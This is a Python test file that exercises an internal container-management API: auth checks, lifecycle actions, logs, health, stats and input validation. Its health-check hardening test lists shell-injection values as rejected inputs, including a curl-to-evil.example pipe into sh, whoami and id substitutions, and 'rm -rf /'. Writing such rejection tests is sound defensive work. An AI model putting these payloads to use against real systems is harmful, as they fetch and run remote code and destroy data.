"""Integration tests for the Part D lifecycle routes (Phase 5).

The real :class:`ContainerService` is used, wired to a mocked DockerService and
an in-memory repository fake, via ``app.dependency_overrides``. No Docker daemon
or PostgreSQL instance is required.
"""

from __future__ import annotations

import json
import logging
from types import SimpleNamespace
from typing import Any, Dict, List, Tuple
from unittest.mock import MagicMock

import pytest
import pytest_asyncio
from httpx import ASGITransport, AsyncClient

from app.config import get_settings
from app.dependencies import get_container_service
from app.main import create_app
from app.services.container_service import ContainerService
from app.services.docker_service import DockerServiceException
from app.services.encryption_service import EncryptionService
from tests.fakes import FakeContainerRepository, make_doc

BASE = "/internal/v1/containers"
TEST_KEY = "0123456789abcdef" * 4
DOCKER_ID = "d" * 64

#: Every router-level route (method, path suffix) that must reject bad auth.
ROUTES: List[Tuple[str, str]] = [
    ("post", ""),
    ("get", ""),
    ("get", "/cnt_1"),
    ("post", "/cnt_1/start"),
    ("post", "/cnt_1/stop"),
    ("post", "/cnt_1/restart"),
    ("delete", "/cnt_1"),
    ("get", "/cnt_1/logs"),
    ("get", "/cnt_1/health"),
    ("get", "/cnt_1/stats"),
]

_ENC = EncryptionService(TEST_KEY)


def create_payload(secret_ref: str) -> Dict[str, Any]:
    """A valid create body (Part D example shape)."""
    return {
        "deploymentId": "dep_1",
        "serviceId": "svc_1",
        "image": "shipyard-app/backend:dep_1",
        "ports": [{"containerPort": 8000, "hostPort": 18000, "protocol": "tcp"}],
        "resources": {"cpuLimit": "1.0", "memoryLimit": "512Mi"},
        "healthCheck": {
            "path": "/health",
            "port": 8000,
            "intervalSeconds": 10,
            "timeoutSeconds": 5,
            "retries": 3,
        },
        "env": [{"key": "DATABASE_URL", "secretRef": secret_ref}],
    }


@pytest_asyncio.fixture()
async def stack():
    """App + AsyncClient with the real service over in-memory doubles."""
    repository = FakeContainerRepository()
    docker = MagicMock()
    docker.default_network = "shipyard_network"
    docker.create_and_run.return_value = DOCKER_ID
    service = ContainerService(
        repository=repository,
        docker_service=docker,
        encryption_service=EncryptionService(TEST_KEY),
    )
    app = create_app()
    app.dependency_overrides[get_container_service] = lambda: service
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        yield SimpleNamespace(
            client=client,
            app=app,
            service=service,
            repository=repository,
            docker=docker,
        )


@pytest.fixture()
def headers() -> Dict[str, str]:
    return {"X-API-Key": get_settings().INTERNAL_API_KEY}


# ---------------------------------------------------------------------------
# Authentication
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("method,path", ROUTES)
async def test_route_requires_api_key(stack, method: str, path: str) -> None:
    resp = await stack.client.request(method, BASE + path)
    assert resp.status_code == 403
    assert resp.json()["error"]["code"] == "INVALID_API_KEY"


@pytest.mark.parametrize("method,path", ROUTES)
async def test_route_rejects_wrong_api_key(stack, method: str, path: str) -> None:
    resp = await stack.client.request(
        method, BASE + path, headers={"X-API-Key": "definitely-wrong"}
    )
    assert resp.status_code == 403
    assert resp.json()["error"]["code"] == "INVALID_API_KEY"


# ---------------------------------------------------------------------------
# Create
# ---------------------------------------------------------------------------
async def test_create_returns_201_without_secrets(stack, headers) -> None:
    secret = "super-secret-value"
    resp = await stack.client.post(
        BASE, json=create_payload(_ENC.encrypt(secret)), headers=headers
    )
    assert resp.status_code == 201

    body = resp.json()
    assert set(body) == {
        "containerId",
        "deploymentId",
        "serviceId",
        "image",
        "status",
        "ports",
        "resources",
        "createdAt",
    }
    assert body["containerId"].startswith("cnt_")
    assert body["status"] == "running"
    assert body["deploymentId"] == "dep_1"
    assert body["ports"][0] == {
        "containerPort": 8000,
        "hostPort": 18000,
        "protocol": "tcp",
    }
    assert body["resources"] == {"cpuLimit": "1.0", "memoryLimit": "512Mi"}

    text = resp.text
    assert secret not in text
    assert "enc:" not in text
    assert "envKeys" not in text
    assert "dockerContainerId" not in text

    stored = stack.repository.rows[body["containerId"]]
    assert stored["env_keys"] == ["DATABASE_URL"]
    assert secret not in json.dumps(stored, default=str)


async def test_create_invalid_memory_maps_400(stack, headers) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload["resources"]["memoryLimit"] = "512XX"
    resp = await stack.client.post(BASE, json=payload, headers=headers)
    assert resp.status_code == 400
    assert resp.json()["error"]["code"] == "INVALID_PAYLOAD"
    assert not stack.docker.create_and_run.called


async def test_create_bad_secret_ref_maps_400(stack, headers) -> None:
    resp = await stack.client.post(
        BASE, json=create_payload("not-encrypted"), headers=headers
    )
    assert resp.status_code == 400
    assert resp.json()["error"]["code"] == "INVALID_PAYLOAD"
    assert not stack.docker.create_and_run.called


async def test_create_missing_field_maps_400(stack, headers) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload.pop("deploymentId")
    resp = await stack.client.post(BASE, json=payload, headers=headers)
    assert resp.status_code == 400
    assert resp.json()["error"]["code"] == "INVALID_PAYLOAD"


async def test_create_persistence_failure_compensates(stack, headers) -> None:
    stack.repository.fail_insert = True
    resp = await stack.client.post(
        BASE, json=create_payload(_ENC.encrypt("top-secret")), headers=headers
    )
    assert resp.status_code == 500
    assert resp.json()["error"]["code"] == "DATABASE_ERROR"
    stack.docker.remove.assert_called_once_with(DOCKER_ID, True)
    assert "top-secret" not in resp.text


# ---------------------------------------------------------------------------
# List / details
# ---------------------------------------------------------------------------
async def test_list_returns_camelcase_and_excludes_removed(stack, headers) -> None:
    stack.repository.seed(make_doc("cnt_a", status="running"))
    stack.repository.seed(make_doc("cnt_b", status="stopped"))
    stack.repository.seed(make_doc("cnt_c", status="removed"))

    resp = await stack.client.get(BASE, headers=headers)
    assert resp.status_code == 200
    body = resp.json()
    assert {c["containerId"] for c in body} == {"cnt_a", "cnt_b"}
    assert all("containerId" in c for c in body)


@pytest.mark.parametrize("query", ["?skip=-1", "?limit=0", "?limit=201", "?limit=abc"])
async def test_list_query_bounds_map_422(stack, headers, query: str) -> None:
    resp = await stack.client.get(BASE + query, headers=headers)
    assert resp.status_code == 422
    assert resp.json()["error"]["code"] == "VALIDATION_ERROR"


async def test_list_accepts_boundary_values(stack, headers) -> None:
    resp = await stack.client.get(BASE + "?skip=0&limit=200", headers=headers)
    assert resp.status_code == 200


async def test_get_details_returns_redacted_view(stack, headers) -> None:
    stack.repository.seed(make_doc("cnt_1", status="running"))
    resp = await stack.client.get(f"{BASE}/cnt_1", headers=headers)
    assert resp.status_code == 200
    body = resp.json()
    assert body["containerId"] == "cnt_1"
    assert "dockerContainerId" not in body
    assert "env" not in body
    assert "envKeys" not in body


@pytest.mark.parametrize(
    "method,path",
    [
        ("get", "/cnt_missing"),
        ("post", "/cnt_missing/start"),
        ("post", "/cnt_missing/stop"),
        ("post", "/cnt_missing/restart"),
        ("delete", "/cnt_missing"),
        ("get", "/cnt_missing/logs"),
        ("get", "/cnt_missing/health"),
        ("get", "/cnt_missing/stats"),
    ],
)
async def test_unknown_container_maps_404(stack, headers, method: str, path: str) -> None:
    resp = await stack.client.request(method, BASE + path, headers=headers)
    assert resp.status_code == 404
    assert resp.json()["error"]["code"] == "CONTAINER_NOT_FOUND"


# ---------------------------------------------------------------------------
# Lifecycle actions
# ---------------------------------------------------------------------------
async def test_full_lifecycle_actions(stack, headers) -> None:
    created = await stack.client.post(
        BASE, json=create_payload(_ENC.encrypt("x")), headers=headers
    )
    cid = created.json()["containerId"]

    stopped = await stack.client.post(f"{BASE}/{cid}/stop", headers=headers)
    assert stopped.status_code == 200
    assert stopped.json() == {"containerId": cid, "status": "stopped"}
    stack.docker.stop.assert_called_once_with(DOCKER_ID)

    started = await stack.client.post(f"{BASE}/{cid}/start", headers=headers)
    assert started.status_code == 200
    assert started.json() == {"containerId": cid, "status": "running"}

    restarted = await stack.client.post(f"{BASE}/{cid}/restart", headers=headers)
    assert restarted.status_code == 200
    assert restarted.json()["status"] == "running"

    await stack.client.post(f"{BASE}/{cid}/stop", headers=headers)
    deleted = await stack.client.delete(f"{BASE}/{cid}", headers=headers)
    assert deleted.status_code == 204
    assert deleted.content == b""
    assert stack.repository.rows[cid]["status"] == "removed"


async def test_start_already_running_maps_409(stack, headers) -> None:
    created = await stack.client.post(
        BASE, json=create_payload(_ENC.encrypt("x")), headers=headers
    )
    cid = created.json()["containerId"]
    resp = await stack.client.post(f"{BASE}/{cid}/start", headers=headers)
    assert resp.status_code == 409
    assert resp.json()["error"]["code"] == "ALREADY_RUNNING"


async def test_delete_running_maps_400(stack, headers) -> None:
    created = await stack.client.post(
        BASE, json=create_payload(_ENC.encrypt("x")), headers=headers
    )
    cid = created.json()["containerId"]
    resp = await stack.client.delete(f"{BASE}/{cid}", headers=headers)
    assert resp.status_code == 400
    assert resp.json()["error"]["code"] == "CANNOT_DELETE_RUNNING"
    assert not stack.docker.remove.called
    assert stack.repository.rows[cid]["status"] == "running"


async def test_docker_failure_maps_500_clean(stack, headers) -> None:
    stack.repository.seed(make_doc("cnt_1", status="stopped"))
    stack.docker.start.side_effect = DockerServiceException(
        "engine exploded at /var/run/docker.sock"
    )
    resp = await stack.client.post(f"{BASE}/cnt_1/start", headers=headers)
    assert resp.status_code == 500
    body = resp.json()
    assert body["error"]["code"] == "DOCKER_ENGINE_ERROR"
    assert body["error"]["message"] == "Docker engine request failed"
    assert "exploded" not in resp.text
    assert "docker.sock" not in resp.text


# ---------------------------------------------------------------------------
# Readiness probe
# ---------------------------------------------------------------------------
async def test_ready_returns_200_when_all_connected(stack) -> None:
    stack.app.state.docker_service = SimpleNamespace(
        ping=MagicMock(return_value=True)
    )
    stack.app.state.container_repository = FakeContainerRepository()

    resp = await stack.client.get("/ready")
    assert resp.status_code == 200
    assert resp.json() == {
        "ready": True,
        "docker": "connected",
        "database": "connected",
    }


async def test_ready_returns_503_when_database_down(stack) -> None:
    stack.app.state.docker_service = SimpleNamespace(
        ping=MagicMock(return_value=True)
    )
    stack.app.state.container_repository = FakeContainerRepository(fail_all=True)

    resp = await stack.client.get("/ready")
    assert resp.status_code == 503
    assert resp.json() == {
        "ready": False,
        "docker": "connected",
        "database": "disconnected",
    }


async def test_ready_returns_503_when_docker_unreachable(stack) -> None:
    stack.app.state.docker_service = SimpleNamespace(
        ping=MagicMock(side_effect=RuntimeError("no socket"))
    )
    stack.app.state.container_repository = FakeContainerRepository()

    resp = await stack.client.get("/ready")
    assert resp.status_code == 503
    assert resp.json()["docker"] == "disconnected"


# ---------------------------------------------------------------------------
# Inspection: logs
# ---------------------------------------------------------------------------
async def test_logs_returns_body_and_default_tail(stack, headers) -> None:
    stack.repository.seed(make_doc("cnt_1", status="running"))
    stack.docker.get_logs.return_value = "boot ok\nready\n"

    resp = await stack.client.get(f"{BASE}/cnt_1/logs", headers=headers)

    assert resp.status_code == 200
    assert resp.json() == {"containerId": "cnt_1", "logs": "boot ok\nready\n"}
    stack.docker.get_logs.assert_called_once_with(DOCKER_ID, 500)


async def test_logs_passes_tail_query(stack, headers) -> None:
    stack.repository.seed(make_doc("cnt_1", status="running"))
    stack.docker.get_logs.return_value = "line\n"

    resp = await stack.client.get(f"{BASE}/cnt_1/logs?tail=25", headers=headers)

    assert resp.status_code == 200
    stack.docker.get_logs.assert_called_once_with(DOCKER_ID, 25)


@pytest.mark.parametrize("tail", ["0", "-1", "5001", "abc"])
async def test_logs_invalid_tail_maps_422(stack, headers, tail: str) -> None:
    resp = await stack.client.get(f"{BASE}/cnt_1/logs?tail={tail}", headers=headers)
    assert resp.status_code == 422
    assert resp.json()["error"]["code"] == "VALIDATION_ERROR"
    assert not stack.docker.get_logs.called


async def test_logs_accepts_boundary_limits(stack, headers) -> None:
    stack.repository.seed(make_doc("cnt_1", status="running"))
    stack.docker.get_logs.return_value = ""
    for tail in ("1", "5000"):
        resp = await stack.client.get(f"{BASE}/cnt_1/logs?tail={tail}", headers=headers)
        assert resp.status_code == 200


async def test_logs_docker_failure_maps_500_clean(stack, headers) -> None:
    stack.repository.seed(make_doc("cnt_1", status="running"))
    stack.docker.get_logs.side_effect = DockerServiceException(
        "internal daemon path /var/run/docker.sock exploded"
    )

    resp = await stack.client.get(f"{BASE}/cnt_1/logs", headers=headers)

    assert resp.status_code == 500
    body = resp.json()
    assert body["error"]["code"] == "LOG_READ_ERROR"
    assert body["error"]["message"] == "Failed to read container logs"
    assert "exploded" not in resp.text
    assert "docker.sock" not in resp.text


# ---------------------------------------------------------------------------
# Inspection: health
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("status", ["healthy", "unhealthy", "starting", "none"])
async def test_health_maps_all_statuses(stack, headers, status: str) -> None:
    stack.repository.seed(make_doc("cnt_1", status="running"))
    stack.docker.get_health.return_value = {
        "Status": status,
        "FailingStreak": 0,
        "Log": [],
    }

    resp = await stack.client.get(f"{BASE}/cnt_1/health", headers=headers)

    assert resp.status_code == 200
    assert resp.json() == {
        "containerId": "cnt_1",
        "status": status,
        "failingStreak": 0,
        "log": [],
    }


async def test_health_maps_log_entries_to_camelcase(stack, headers) -> None:
    stack.repository.seed(make_doc("cnt_1", status="running"))
    stack.docker.get_health.return_value = {
        "Status": "unhealthy",
        "FailingStreak": 2,
        "Log": [
            {
                "Start": "2026-10-14T03:00:10Z",
                "End": "2026-10-14T03:00:11Z",
                "ExitCode": 1,
                "Output": "boom\n",
            }
        ],
    }

    resp = await stack.client.get(f"{BASE}/cnt_1/health", headers=headers)

    assert resp.status_code == 200
    body = resp.json()
    assert body["failingStreak"] == 2
    assert body["log"] == [
        {
            "start": "2026-10-14T03:00:10Z",
            "end": "2026-10-14T03:00:11Z",
            "exitCode": 1,
            "output": "boom\n",
        }
    ]


async def test_health_docker_failure_maps_500_clean(stack, headers) -> None:
    stack.repository.seed(make_doc("cnt_1", status="running"))
    stack.docker.get_health.side_effect = DockerServiceException("secret internals")

    resp = await stack.client.get(f"{BASE}/cnt_1/health", headers=headers)

    assert resp.status_code == 500
    assert resp.json()["error"]["code"] == "HEALTH_INSPECT_ERROR"
    assert resp.json()["error"]["message"] == "Failed to inspect container health"
    assert "secret internals" not in resp.text


# ---------------------------------------------------------------------------
# Inspection: stats
# ---------------------------------------------------------------------------
async def test_stats_returns_snapshot(stack, headers) -> None:
    stack.repository.seed(make_doc("cnt_1", status="running"))
    stack.docker.get_stats.return_value = {
        "cpu_stats": {
            "cpu_usage": {"total_usage": 300, "percpu_usage": [100, 200]},
            "system_cpu_usage": 2000,
            "online_cpus": 2,
        },
        "precpu_stats": {
            "cpu_usage": {"total_usage": 100},
            "system_cpu_usage": 1000,
        },
        "memory_stats": {"usage": 100 * 1024 * 1024, "limit": 512 * 1024 * 1024},
        "networks": {"eth0": {"rx_bytes": 1500, "tx_bytes": 2500}},
    }

    resp = await stack.client.get(f"{BASE}/cnt_1/stats", headers=headers)

    assert resp.status_code == 200
    assert resp.json() == {
        "containerId": "cnt_1",
        "cpuPercent": 40.0,
        "memoryUsageMb": 100.0,
        "memoryLimitMb": 512.0,
        "networkRxBytes": 1500,
        "networkTxBytes": 2500,
    }


async def test_stats_not_running_returns_zeros(stack, headers) -> None:
    stack.repository.seed(make_doc("cnt_1", status="stopped"))

    resp = await stack.client.get(f"{BASE}/cnt_1/stats", headers=headers)

    assert resp.status_code == 200
    assert resp.json() == {
        "containerId": "cnt_1",
        "cpuPercent": 0.0,
        "memoryUsageMb": 0.0,
        "memoryLimitMb": 0.0,
        "networkRxBytes": 0,
        "networkTxBytes": 0,
    }
    assert not stack.docker.get_stats.called


async def test_stats_docker_failure_maps_500_clean(stack, headers) -> None:
    stack.repository.seed(make_doc("cnt_1", status="running"))
    stack.docker.get_stats.side_effect = DockerServiceException("internal leak")

    resp = await stack.client.get(f"{BASE}/cnt_1/stats", headers=headers)

    assert resp.status_code == 500
    assert resp.json()["error"]["code"] == "STATS_STREAM_ERROR"
    assert resp.json()["error"]["message"] == "Failed to read container stats"
    assert "internal leak" not in resp.text


# ---------------------------------------------------------------------------
# Auth coverage: derived from the app's own route table (future-proof)
# ---------------------------------------------------------------------------
async def test_every_registered_container_route_requires_api_key(stack) -> None:
    routes = [
        (method.upper(), path.replace("{container_id}", "cnt_1"))
        for path, operations in stack.app.openapi()["paths"].items()
        if path.startswith("/internal/v1/containers")
        for method in operations
    ]

    assert len(routes) == 10, routes
    for method, url in routes:
        resp = await stack.client.request(method, url)
        assert resp.status_code == 403, f"{method} {url} -> {resp.status_code}"
        assert resp.json()["error"]["code"] == "INVALID_API_KEY", f"{method} {url}"


@pytest.mark.parametrize("path", ["/health", "/ready"])
async def test_ops_probes_are_intentionally_unauthenticated(stack, path: str) -> None:
    resp = await stack.client.get(path)
    assert resp.status_code != 403 or resp.json()["error"]["code"] != "INVALID_API_KEY"


# ---------------------------------------------------------------------------
# Input hardening: resource caps
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("memory", ["65Gi", "1024Gi"])
async def test_create_rejects_oversized_memory(stack, headers, memory: str) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload["resources"]["memoryLimit"] = memory

    resp = await stack.client.post(BASE, json=payload, headers=headers)

    assert resp.status_code == 400
    assert resp.json()["error"]["code"] == "INVALID_PAYLOAD"
    assert not stack.docker.create_and_run.called


async def test_create_accepts_memory_at_the_cap(stack, headers) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload["resources"]["memoryLimit"] = "64Gi"

    resp = await stack.client.post(BASE, json=payload, headers=headers)

    assert resp.status_code == 201


@pytest.mark.parametrize("cpu", ["17", "1000"])
async def test_create_rejects_oversized_cpu(stack, headers, cpu: str) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload["resources"]["cpuLimit"] = cpu

    resp = await stack.client.post(BASE, json=payload, headers=headers)

    assert resp.status_code == 400
    assert resp.json()["error"]["code"] == "INVALID_PAYLOAD"
    assert not stack.docker.create_and_run.called


async def test_create_accepts_cpu_at_the_cap(stack, headers) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload["resources"]["cpuLimit"] = "16"

    resp = await stack.client.post(BASE, json=payload, headers=headers)

    assert resp.status_code == 201


# ---------------------------------------------------------------------------
# Input hardening: healthcheck (path is interpolated into a shell command)
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "bad_path",
    [
        "/health; curl http://evil.example | sh",
        "/health`whoami`",
        "/health$(id)",
        "/health && rm -rf /",
        "no-leading-slash",
        "/health with space",
        "/health\nX",
    ],
)
async def test_create_rejects_unsafe_health_path(
    stack, headers, bad_path: str
) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload["healthCheck"]["path"] = bad_path

    resp = await stack.client.post(BASE, json=payload, headers=headers)

    assert resp.status_code == 400
    assert resp.json()["error"]["code"] == "INVALID_PAYLOAD"
    assert not stack.docker.create_and_run.called


async def test_create_accepts_safe_health_path_with_query(stack, headers) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload["healthCheck"]["path"] = "/api/health?deep=true"

    resp = await stack.client.post(BASE, json=payload, headers=headers)

    assert resp.status_code == 201


@pytest.mark.parametrize("port", [0, -1, 70000])
async def test_create_rejects_out_of_range_health_port(
    stack, headers, port: int
) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload["healthCheck"]["port"] = port

    resp = await stack.client.post(BASE, json=payload, headers=headers)

    assert resp.status_code == 400
    assert resp.json()["error"]["code"] == "INVALID_PAYLOAD"


@pytest.mark.parametrize(
    "field,value",
    [
        ("intervalSeconds", 0),
        ("intervalSeconds", 3601),
        ("timeoutSeconds", 0),
        ("timeoutSeconds", 61),
        ("retries", 0),
        ("retries", 101),
    ],
)
async def test_create_rejects_out_of_range_health_timings(
    stack, headers, field: str, value: int
) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload["healthCheck"][field] = value

    resp = await stack.client.post(BASE, json=payload, headers=headers)

    assert resp.status_code == 400
    assert resp.json()["error"]["code"] == "INVALID_PAYLOAD"


# ---------------------------------------------------------------------------
# Input hardening: env / ports / identifiers
# ---------------------------------------------------------------------------
@pytest.mark.parametrize(
    "key", ["DB=INJECTED", "1LEADING", "has space", "", "a" * 129, "K-EY"]
)
async def test_create_rejects_invalid_env_key(stack, headers, key: str) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload["env"] = [{"key": key, "secretRef": _ENC.encrypt("x")}]

    resp = await stack.client.post(BASE, json=payload, headers=headers)

    assert resp.status_code == 400
    assert resp.json()["error"]["code"] == "INVALID_PAYLOAD"
    assert not stack.docker.create_and_run.called


async def test_create_rejects_too_many_ports(stack, headers) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload["ports"] = [{"containerPort": 1, "protocol": "tcp"}] * 33

    resp = await stack.client.post(BASE, json=payload, headers=headers)

    assert resp.status_code == 400
    assert resp.json()["error"]["code"] == "INVALID_PAYLOAD"


async def test_create_rejects_too_many_env_vars(stack, headers) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload["env"] = [
        {"key": f"K{i}", "secretRef": _ENC.encrypt("x")} for i in range(101)
    ]

    resp = await stack.client.post(BASE, json=payload, headers=headers)

    assert resp.status_code == 400
    assert resp.json()["error"]["code"] == "INVALID_PAYLOAD"


@pytest.mark.parametrize(
    "field,value",
    [
        ("deploymentId", ""),
        ("serviceId", ""),
        ("image", ""),
        ("image", "x" * 513),
        ("deploymentId", "d" * 129),
    ],
)
async def test_create_rejects_bad_identifiers(
    stack, headers, field: str, value: str
) -> None:
    payload = create_payload(_ENC.encrypt("x"))
    payload[field] = value

    resp = await stack.client.post(BASE, json=payload, headers=headers)

    assert resp.status_code == 400
    assert resp.json()["error"]["code"] == "INVALID_PAYLOAD"


# ---------------------------------------------------------------------------
# Secret hygiene on the happy path
# ---------------------------------------------------------------------------
async def test_successful_create_writes_no_secrets_to_logs(
    stack, headers, caplog
) -> None:
    secret = "super-secret-value"
    secret_ref = _ENC.encrypt(secret)

    with caplog.at_level(logging.DEBUG):
        resp = await stack.client.post(
            BASE, json=create_payload(secret_ref), headers=headers
        )

    assert resp.status_code == 201
    assert secret not in caplog.text
    assert secret_ref not in caplog.text
    assert headers["X-API-Key"] not in caplog.text
